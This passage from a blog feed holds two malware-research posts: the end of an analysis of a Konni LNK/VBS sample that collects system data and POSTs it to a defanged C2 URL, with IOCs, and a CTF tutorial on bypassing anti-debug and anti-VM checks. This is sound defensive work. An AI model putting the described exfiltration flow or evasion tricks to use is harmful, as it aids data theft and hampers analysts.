+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126120119.png" alt="" /></p>
+
+<p>Other than dir enumeration, malware also checks the IP details, systeminfo, process running, what are the keys of the CurrentVersion\RUN Key and then send all the files data to the url.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126120144.png" alt="" /></p>
+
+<h4 id="how-code-flow-works-">How code flow works ?</h4>
+<p>In the last vbs code there is a function and for all the commands output those are stored in the file, those filenames are sent to MX0Wu3ou and then data is read from the file and send to the url and file will be deleted.</p>
+
+<ul>
+  <li>MX0Wu3ou Function definition, it takes two arguments
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126202819.png" alt="" /></li>
+</ul>
+
+<p>After removing all the xor operations and other garbage these are the commands executed [ I have converted the variable names to meaningful ].</p>
+<ul>
+  <li>FileSystemObject is created and using this malware will read the file which is provided as argument to the function and then file will be deleted</li>
+  <li>The data to be sent is convert into the format: alias=&lt;computername&gt;&amp;name=&lt;filename&gt;&amp;data=&lt;FileContent&gt;</li>
+  <li>Then the data sent to the url using post method
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126203631.png" alt="" /></li>
+</ul>
+
+<p>Before calling the function MX0Wu3ou the CurrentDirectory is set to the public user Library folder from where the vbs script is executing and then using the cmd.exe commands are executed and saved to files.<br />
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126210118.png" alt="" /></p>
+
+<p><strong>How function MX0Wu3ou is called ?</strong> After the XOR operation we have the filename to send as first argument and the second argument will always be our computername.
+<img src="/assets/img/Konni_Mal/Pasted%20image%2020240126203909.png" alt="" /></p>
+
+<p>Then after every 10 mins the schedule task will run and the vbs will be downloaded and as the computer is unique the second vbs will be download and all details will be collected again and send to the malware author.</p>
+
+<h2 id="iocs">IOCs</h2>
+
+<h3 id="url">URL</h3>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Value</td>
+      <td>Description</td>
+    </tr>
+    <tr>
+      <td>hxxps[://]shaira1885[.]com/wp-admin/includes/class-wp-release-data[.]php?class=</td>
+      <td>Gets next stage payloads</td>
+    </tr>
+    <tr>
+      <td>hxxps[://]shaira1885[.]com/wp-admin/includes/class-wp-release-data[.]php</td>
+      <td>Send the Data using POST method</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="file-names">File Names</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Value</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>vc98ee3f0.vbs</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="hashes">Hashes</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Hash Type</th>
+      <th>Value</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>SHA1</td>
+      <td>2b1a9f3fbfc6f2a3efd8d2ed0d1a85ae839b4d31</td>
+      <td>vc98ee3f0.vbs</td>
+    </tr>
+    <tr>
+      <td>SHA1</td>
+      <td>ea8037e7c58dade74a27493c327b18fb06e600f5</td>
+      <td>2nd_stage.vbs: Payload used to setup the scheduled task</td>
+    </tr>
+    <tr>
+      <td>SHA1</td>
+      <td>e44e0021a1d866b19ddba09d395180f69f686290</td>
+      <td>final_vbs.vbs: Payload used to collect the user system data</td>
+    </tr>
+  </tbody>
+</table>]]></content><author><name></name></author><summary type="html"><![CDATA[This blog will cover the technical analysis of Konni malware family malicious Lnk file. But before starting the analysis I know you are asking a question what/who is konni ?]]></summary></entry><entry><title type="html">Anti-VM, Anti-Debug &amp;amp; Anti-* Bypass Part - 1</title><link href="http://localhost:4000/2024/01/22/Malware-Anti-Analysis-&-Anti-Debug-Bypass.html" rel="alternate" type="text/html" title="Anti-VM, Anti-Debug &amp;amp; Anti-* Bypass Part - 1" /><published>2024-01-22T00:00:00+05:30</published><updated>2024-01-22T00:00:00+05:30</updated><id>http://localhost:4000/2024/01/22/Malware%20Anti-Analysis%20&amp;%20Anti-Debug%20Bypass</id><content type="html" xml:base="http://localhost:4000/2024/01/22/Malware-Anti-Analysis-&amp;-Anti-Debug-Bypass.html"><![CDATA[<h1 id="overview">Overview</h1>
+<p>Malware is a piece of software which is created by some smart developers who think out of the box and this piece of software is more complex to reverse engineer because they implemented a lot of Anti-Analysis, Anti-Bypass, Anti-VM and all other Anti stuff. Therefore as reverse Engineers and Malware analysts, we should also be aware of how to bypass all the anti.</p>
+
+<blockquote>
+  <p>[!NOTE] : I’m not an expert, but I’m keen on improvement. If you spot any mistakes in my blog, please DM me on any platform you like for constructive feedback.</p>
+</blockquote>
+
+<p>The sample I have taken from the <a href="https://github.com/MinervaLabsResearch/MinervaCTF">Minerva CTF</a></p>
+<h1 id="techniques-covered">Techniques Covered</h1>
+<ul>
+  <li>IsDebuggerPresent</li>
+  <li>CPUID Check</li>
+  <li>peb-&gt;IsBeingDebugged</li>
+  <li>VMChecks by Name</li>
+  <li>HiddenThread</li>
+</ul>
+
+<h2 id="1-isdebuggerpresent">1. IsDebuggerPresent</h2>
+
+<h3 id="understanding-implementation">Understanding Implementation</h3>
+<p>This is a winapi which can be used by the application to check if the application is being debugged by user mode debugger. The API will be called and the result can be compared if it is zero or non-zero. If it is non-zero, it means the program is being debugged and the program will exit.</p>
+
+<h4 id="assembly--disassembled-code">Assembly &amp; Disassembled Code</h4>
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240116145429.png" alt="" />
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240116144836.png" alt="" /></p>
+<h3 id="how-to-bypass">How to Bypass</h3>
+<ul>
+  <li>Set the breakpoint on the IsDebuggerPresent API [ in x32 dbg use: bp IsDebuggerPresent ]</li>
+  <li>Execute till the program hits the API breakpoint and then execute till the return</li>
+  <li>On return, the eax register value will be 1 [ non-zero ] 
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240116145458.png" alt="" /></li>
+  <li>Change the value of the eax register to zero, save and continue the execution
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240116145525.png" alt="" /></li>
+</ul>
+
+<h2 id="2-cpuid-instruction">2. CPUID Instruction</h2>
+
+<h3 id="understanding-implementation-1">Understanding Implementation</h3>
+<p>This instruction is executed with EAX=1 as input, the return value describes the processor’s features. The 31st bit of ECX on a physical machine will be equal to 0. On a guest VM it will equal to 1. [ <a href="https://www.cyberbit.com/blog/endpoint-security/anti-vm-and-anti-sandbox-explained/">Shamelessly taken from cyberbit</a> ]</p>
+
+<h4 id="assembly--disassembled-code-1">Assembly &amp; Disassembled Code</h4>
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240116151450.png" alt="" /></p>
+
+<h3 id="how-to-bypass-1">How to Bypass</h3>
+
+<h4 id="method-1">Method 1</h4>
+<ul>
+  <li>Execute step by step to find the cpuid instruction</li>
+  <li>Execute till return of the function 
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122135255.png" alt="" /></li>
+  <li>Update the eax register 31st byte to 0, save and continue the execution</li>
+</ul>
+
+<h4 id="method-2">Method 2</h4>
+<ul>
+  <li>If using the VmWare, update the vmx file</li>
+  <li>Add the following to the bottom of the vmx file
+    <div class="language-yml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">cpuid.1.ecx="0---:----:----:----:----:----:----:----"</span>
+</code></pre></div>    </div>
+  </li>
+  <li>No need to wait or find the cpuid instruction, It will automatically be handled by the vmx configuration</li>
+</ul>
+
+<h2 id="3-peb-isbeingdebugged">3. peb-&gt;IsBeingDebugged</h2>
+
+<h3 id="understanding-peb">Understanding PEB</h3>
+<p>PEB [ Process Environment Block ] is a critical structure in the Windows OS, most of its fields are not intended to be used by other than the operating system. It contains data structures that apply across a whole process and is stored in user-mode memory, which makes it accessible for the corresponding process <a href="https://void-stack.github.io/blog/post-Exploring-PEB/">[ Taken From Void-Stack Blog ]</a>. The structure contains valuable information about the running process, including:</p>
+
+<ul>
+  <li>whether the process is being debugged or not</li>
+  <li>which modules are loaded into memory</li>
+  <li>the command line used to invoke the process</li>
+</ul>
+
+<h3 id="understanding-implementation-2">Understanding Implementation</h3>
+<p>This structure can be used to find the information if the program is being debugged or not. 
+The below image is from the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">Microsoft Documents</a>. It shows that the second member of the _ <em>PEB</em> structure is BeingDebugged which we can use to find if a debugger is attached or not. 
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121145722.png" alt="" /></p>
+
+<p>But when we used the WinDBG to check the  _ <em>PEB</em>  of a debugger attached process, we found BeingDebugged is not the second member it is the third member [ index 0x02 ]</p>
+
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240116165451.png" alt="" /></p>
+
+<p>Checking the implementation of this anti-debug technique in malware we found this is similar to the IsDebugPreesent API.</p>
+<ul>
+  <li>Both first get the address of the PEB Structure</li>
+  <li>Then check the value present at the eax+2 [ Location of the BeingDebugged Member ].</li>
+  <li>If it compares to zero then the program continues otherwise exits.</li>
+</ul>
+
+<h4 id="assembly--disassembled-code-2">Assembly &amp; Disassembled Code</h4>
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121153452.png" alt="" /></p>
+
+<h3 id="how-to-bypass-2">How to Bypass</h3>
+
+<h4 id="method-1-1">Method 1</h4>
+<ul>
+  <li>Execute step-by-step to find where this check implemented</li>
+  <li>
+    <p>Execute till we reach the next instruction of where the program is moving the byte from the PEB to a variable [ mov [ebp+var-6D], al ]
+ <img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121191556.png" alt="" /></p>
+  </li>
+  <li>Change the value of the al to zero and continue the execution
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121191524.png" alt="" /></li>
+</ul>
+
+<h4 id="method-2-1">Method 2</h4>
+<ul>
+  <li>Execute step-by-step to find where this check implemented</li>
+  <li>Select the jne operation and fill with nops [ 0x90 ] and continue the execution
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121191718.png" alt="" />
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121191912.png" alt="" />
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121191642.png" alt="" /></li>
+</ul>
+
+<h2 id="4-vmchecks-by-name">4. VMChecks by Name</h2>
+
+<h3 id="understanding-implementation-3">Understanding Implementation</h3>
+<p>There can be multiple ways to check the virtualization software used by registry keys, files, directories etc.
+Example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dir: C:\Program Files\VMware
+Filename: vmtoolsd.exe
+</code></pre></div></div>
+<p>But this malware used the Win API keys to find the name and compare, if the name matches, the malware stops the execution and exits the process.</p>
+
+<p>API Keys Used:</p>
+<ul>
+  <li><a href="https://learn.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw">SetupDiGetClassDevsW</a> : It is used in Windows programming to retrieve a handle to a device information set that contains information about a specified class of devices.
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HDEVINFO</span> <span class="nf">SetupDiGetClassDevsW</span><span class="p">(</span> 
+<span class="k">const</span> <span class="n">GUID</span> <span class="o">*</span><span class="n">ClassGuid</span><span class="p">,</span> 
+<span class="n">PCWSTR</span> <span class="n">Enumerator</span><span class="p">,</span> 
+<span class="n">HWND</span> <span class="n">hwndParent</span><span class="p">,</span> 
+<span class="n">DWORD</span> <span class="n">Flags</span> 
+<span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+  <li><a href="https://learn.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupdienumdeviceinfo">SetupDiEnumDeviceInfo</a> : This is used to retrieve a specified Plug and Play (PnP) device property for a device instance.
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">SetupDiEnumDeviceInfo</span><span class="p">(</span> 
+<span class="n">HDEVINFO</span> <span class="n">DeviceInfoSet</span><span class="p">,</span> 
+<span class="n">DWORD</span> <span class="n">MemberIndex</span><span class="p">,</span> 
+<span class="n">PSP_DEVINFO_DATA</span> <span class="n">DeviceInfoData</span> 
+<span class="p">);</span>
+</code></pre></div>    </div>
+  </li>
+  <li><a href="https://learn.microsoft.com/en-us/windows/win32/api/setupapi/nf-setupapi-setupdigetdeviceregistrypropertyw">SetupDiGetDeviceRegistryPropertyW</a> : This API retrieves a specified Plug and Play (PnP) device property for a device instance. This function is often used in conjunction with <code class="language-plaintext highlighter-rouge">SetupDiGetClassDevsW</code> and <code class="language-plaintext highlighter-rouge">SetupDiEnumDeviceInfo</code> to obtain detailed information about a device.
+    <ul>
+      <li>The constant <code class="language-plaintext highlighter-rouge">0xCU</code> is typically used for the property <code class="language-plaintext highlighter-rouge">SPDRP_CHARACTERISTICS</code>. The <code class="language-plaintext highlighter-rouge">SPDRP_CHARACTERISTICS</code> property represents the characteristics of a Plug and Play (PnP) device.
+        <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">SetupDiGetDeviceRegistryPropertyW</span><span class="p">(</span> 
+<span class="n">HDEVINFO</span> <span class="n">DeviceInfoSet</span><span class="p">,</span> 
+<span class="n">PSP_DEVINFO_DATA</span> <span class="n">DeviceInfoData</span><span class="p">,</span> 
+<span class="n">DWORD</span> <span class="n">Property</span><span class="p">,</span> 
+<span class="n">PDWORD</span> <span class="n">PropertyRegDataType</span><span class="p">,</span> 
+<span class="n">PBYTE</span> <span class="n">PropertyBuffer</span><span class="p">,</span> 
+<span class="n">DWORD</span> <span class="n">PropertyBufferSize</span><span class="p">,</span>
+<span class="n">PDWORD</span> <span class="n">RequiredSize</span> 
+<span class="p">);</span>
+</code></pre></div>        </div>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h4 id="assembly--disassembled-code-3">Assembly &amp; Disassembled Code</h4>
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121154512.png" alt="" /></p>
+
+<h3 id="how-to-bypass-3">How to Bypass</h3>
+
+<ul>
+  <li>Set the breakpoint for the API to find when the execution hit the anti-VM checks</li>
+  <li>
+    <p>In the below image it can be seen that SetupDiGetDeviceRegistryPropertyW found about our disk i.e, VMWARE VIRTUAL NVME DISK
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121192147.png" alt="" /></p>
+  </li>
+  <li>The First check is for the VBOX Keyword and then VMWARE keyword is compared.
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122092200.png" alt="" /></li>
+</ul>
+
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122092315.png" alt="" /></p>
+
+<ul>
+  <li>Malware in our case update the al value in both cases VBOX or VMWARE
+    <ul>
+      <li>In VBOX case after comparing it follow the jne and then mov 1 to al and ret</li>
+      <li>In VMWARE same is done compare and then comparison, it moves the 1 to al but this time it uses <a href="https://faydoc.tripod.com/cpu/setne.htm"><strong>setne</strong></a>
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122090055.png" alt="" />
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122095345.png" alt="" /></li>
+    </ul>
+  </li>
+  <li>Update the al value to 0, because if the function returns 1 then it will exit after few instructions as shown in the below image</li>
+</ul>
+
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122095445.png" alt="" /></p>
+
+<h2 id="5-hiddenthread">5. HiddenThread</h2>
+
+<h3 id="understanding-implementation-4">Understanding Implementation</h3>
+<p>In the <code class="language-plaintext highlighter-rouge">Assembly &amp; Disassembled Code</code>  image, we can identify that there are two API calls are used:</p>
+<ul>
+  <li>NtCreateThreadEx</li>
+  <li>NtSetInformationThread</li>
+</ul>
+
+<h4 id="ntcreatethreadex">NtCreateThreadEx</h4>
+<p>This is an undocumented API which can be used to create Threads.</p>
+
+<p>Function definition is taken from : <a href="https://ntdoc.m417z.com/">https://ntdoc.m417z.com/</a>
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121171111.png" alt="" /></p>
+<h4 id="ntsetinformationthread">NtSetInformationThread</h4>
+<p>This API can be used to update the Thread information and malware can also use this API to hide threads.</p>
+
+<p><strong>But why to hide threads ?</strong></p>
+
+<p>The threads will be hidden from the debugger and instructions executed by this hidden thread will not be monitored by the debugger even if we already set the breakpoint on API or instructions.</p>
+
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121171145.png" alt="" /></p>
+
+<p><strong>How this can be achieved ?</strong></p>
+
+<p>Check the 2nd red box in the below image, we have provided the 0x11 as input to the <em>NtSetInformationThread</em> API which will be used to make the thread hidden.</p>
+
+<h4 id="assembly--disassembled-code-4">Assembly &amp; Disassembled Code</h4>
+<p><img src="/assets/img/Malware_Bypass/Pasted%20image%2020240121163843.png" alt="" /></p>
+
+<h3 id="how-to-bypass-4">How to Bypass</h3>
+<ul>
+  <li>The malware is dynamically resolving the address of WIN API: NtCreateThreadEx &amp; NtSetInformationThread, so we can’t directly put the breakpoint and wait, Reason if you setup the breakpoint on the two APIs in my case ZwSetInformationThread is hit but before I reach to the user code and update the value the API is already called and program exit.
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122110145.png" alt="" /></li>
+  <li>We can find this either through manual one-step execution[ which is not a good idea ], or the second way by putting the breakpoint on GetProcAddress after you reach the entrypoint of the binary.</li>
+  <li>Once you reach the breakpoint click on the button <code class="language-plaintext highlighter-rouge">run to user code</code> as shown in the below image and check if you reach the correct GetProcAddress.
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122100541.png" alt="" /></li>
+  <li>After a few false hits we reach the NtSetInformationThread API and found that 11 is pushed on the stack and then call eax instruction (eax stores address of NtSetInformationThread)
+<img src="/assets/img/Malware_Bypass/Pasted%20image%2020240122100718.png" alt="" /></li>
+  <li>Change the 0x11 to 0x00 and continue the execution</li>
+</ul>]]></content><author><name></name></author><category term="Malware" /><category term="Reverse Engineer" /><category term="Malware Bypass" /><summary type="html"><![CDATA[Overview Malware is a piece of software which is created by some smart developers who think out of the box and this piece of software is more complex to reverse engineer because they implemented a lot of Anti-Analysis, Anti-Bypass, Anti-VM and all other Anti stuff. Therefore as reverse Engineers and Malware analysts, we should also be aware of how to bypass all the anti.]]></summary></entry></feed>
